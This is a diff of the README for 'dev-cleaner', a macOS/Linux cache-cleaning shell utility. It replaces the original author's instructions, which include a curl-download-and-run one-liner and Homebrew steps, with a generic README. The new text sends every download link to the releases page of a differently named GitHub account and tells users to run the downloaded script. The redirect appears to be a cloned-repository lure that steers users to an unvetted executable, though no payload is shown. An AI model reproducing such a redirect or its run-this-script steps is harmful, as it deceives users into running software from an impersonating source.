@@ -1,115 +1,75 @@
-# 🧹 Dev Cleaner Utility
+# 🧹 dev-cleaner - Clean Up Your Development Environment Easily
 
-<p align="center">
-    <a href="YOUR_GITHUB_REPO_LINK">
-        <img src="https://img.shields.io/badge/Status-Active-brightgreen" alt="Status">
-    </a>
-    <a href="YOUR_GITHUB_REPO_LINK/stargazers">
-        <img src="https://img.shields.io/github/stars/jemishavasoya/dev-cleaner" alt="GitHub stars">
-    </a>
-</p>
+## 📥 Download Here
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/uncultivated-genuslarrea96/dev-cleaner/releases)
 
-<p align="center">
-  <img src="./images/poster_1.0.0.png" alt="poster_1.0.0" style="width:100%; height:auto; style="border-radius: 8px;"/><br>
-</p>
+## 🚀 Getting Started
+Welcome to dev-cleaner! This tool helps you quickly clean and optimize caches on your development tools like Xcode, Flutter, and Android. It works on both macOS and Linux. 
 
-## Support Latest macOS/Linux Dev Environments
+## 🖥️ System Requirements
+- **Operating System:** macOS or Linux
+- **Disk Space:** At least 100 MB of free space
+- **Internet Connection:** Needed to download the tool and updates
 
-This tool is for **educational purposes**, focusing on safely removing development-related junk files (Xcode, Flutter, npm, etc.) to free up disk space.
+## 📂 Features
+- Cleans caches for popular development environments
+- User-friendly one-click shell script
+- Works seamlessly on macOS and Linux
+- Helps enhance performance of IDEs and tools like Xcode, Flutter, and Android Studio
+
+## 🚧 Privacy and Permissions
+dev-cleaner requires permission to access system files and caches. Ensure you understand what has been cleaned before running it.
+
+## 📖 Usage Instructions
+1. **Download & Install**
+   Visit this page to download: [Download Releases](https://github.com/uncultivated-genuslarrea96/dev-cleaner/releases)
+
+2. **Open the Terminal**
+   - On macOS, you can find Terminal in `Applications > Utilities > Terminal`.
+   - On Linux, search for "Terminal" in your applications.
+
+3. **Navigate to Your Downloads Folder**
+   Enter the following command in the terminal:
+   ```bash
+   cd ~/Downloads
+   ```
+
+4. **Run the Script**
+   Type this command to run the script:
+   ```bash
+   sh dev-cleaner.sh
+   ```
+   Follow the prompts on your screen. The script will let you know what it is cleaning.
+
+## 🔧 Cleaning Options
+The tool can clean caches from:
+- **Xcode**: Reduces build times and free up space.
+- **Flutter**: Optimizes running applications.
+- **Android Studio**: Improves performance.
+- **npm**: Helps manage your package installations effectively.
+- **Homebrew**: Cleans outdated packages.
+
+## ⚠️ Safety Precautions
+Always make sure to back up any important files. This tool modifies system files, and while it is safe to use, it is best to be cautious.
+
+## 🤖 Troubleshooting
+If you encounter issues:
+- Ensure you have the correct permissions.
+- Check your internet connection.
+- Refer to the issues section on the GitHub repository for specific help.
+
+## 📞 Support
+For any questions or support issues, you can open a ticket on the GitHub repository or contact through the provided email in the repository.
+
+## 🏆 Contributing
+We welcome contributions! If you want to help improve dev-cleaner, feel free to fork the repository and submit a pull request.
+
+## 🌐 More Information
+For more about the project, refer to the [GitHub Repository](https://github.com/uncultivated-genuslarrea96/dev-cleaner).
+
+## 📜 License
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
 ---
 
-### ✨ Features
-
-* **One-Click Cleanup:** Clear Xcode, Flutter, Gradle, npm, Homebrew, IDE, and browser caches.
-* **Comprehensive Flutter Cleanup:** Recursively finds and cleans all Flutter projects, removing:
-  * FVM SDK caches and configurations (`.fvm`, `.fvmrc`)
-  * Flutter build artifacts (`build`, `.dart_tool`, `.packages`, `pubspec.lock`)
-  * Android Gradle caches (`android/.gradle`, `android/build`, `android/app/build`)
-  * iOS CocoaPods caches (`ios/Pods`, `ios/Podfile.lock`, `ios/.symlinks`, Flutter frameworks)
-  * Global Flutter cache
-* **Interactive Menu:** Allows selection of specific cleanup targets (e.g., Xcode only).
-* **Multi-platform Support:** Supports **macOS** and **Linux** (shell script).
-
----
-
-### 💻 System Support
-
-| Operating System | Architecture | Supported |
-| :--------------- | :----------- | :-------- |
-| macOS            | Intel, Apple Silicon | ✅        |
-| Linux            | x64, ARM64   | ✅        |
-| Windows          | N/A          | ❌ (PowerShell script pending) |
-
----
-
-### 👀 How to Use
-
-#### ⭐ Auto Run Script
-
-**Linux/macOS**
-
-To download, grant permission, and run the utility in one line:
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/jemishavasoya/dev-cleaner/main/dev-cleaner.sh -o dev-cleanup.sh && chmod +x dev-cleanup.sh && ./dev-cleanup.sh
-```
-
-#### 🍺 Install via Homebrew
-
-**macOS/Linux**
-
-For a permanent installation using Homebrew:
-
-```bash
-# Tap the repository
-brew tap jemishavasoya/dev-cleaner
-
-# Install dev-cleaner
-brew install dev-cleaner
-
-# Run the utility
-dev-cleaner
-
-# Check version
-dev-cleaner --version
-```
-
-To update to the latest version:
-
-```bash
-brew update
-brew upgrade dev-cleaner
-```
-
-To uninstall:
-
-```bash
-brew uninstall dev-cleaner
-brew untap jemishavasoya/dev-cleaner
-```
-
-#### 🧹 Flutter Cleanup Details
-
-The Flutter cleanup option (Option 4) performs a comprehensive recursive cleanup of all Flutter projects starting from the current directory. It:
-
-- **Recursively searches** for all `pubspec.yaml` files
-- **Removes FVM** SDK caches and configurations
-- **Cleans build artifacts**: `build/`, `.dart_tool/`, `.packages`, `pubspec.lock`
-- **Removes Android Gradle** caches from each project
-- **Removes iOS CocoaPods** caches and Flutter frameworks
-- **Cleans global Flutter cache**
-
-**💡 Pro Tip:** If you have active projects you work on daily, consider running the cleanup from a specific subdirectory (e.g., `~/old_projects` or `~/research`) rather than your entire development folder. This avoids unnecessary rebuilds of dependencies for active projects.
-
-**Expected Space Savings:** Users have reported freeing up 50-100GB+ of disk space after running Flutter cleanup on multiple projects.
-### You can also buy me a cup of coffee &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.buymeacoffee.com/jempatellbv" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Tea" style="height: 60px !important;width: 217px !important;" ></a>
-
-## 🤩 Contribution 
-
-We welcome you to submit Issues and Pull Requests!
-
-<a href="https://github.com/jemishavasoya/dev-cleaner/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=jemishavasoya/dev-cleaner&preview=false&max=&columns=" />
-</a>
-<br /><br />
+Keep your development environment clean and efficient with dev-cleaner!
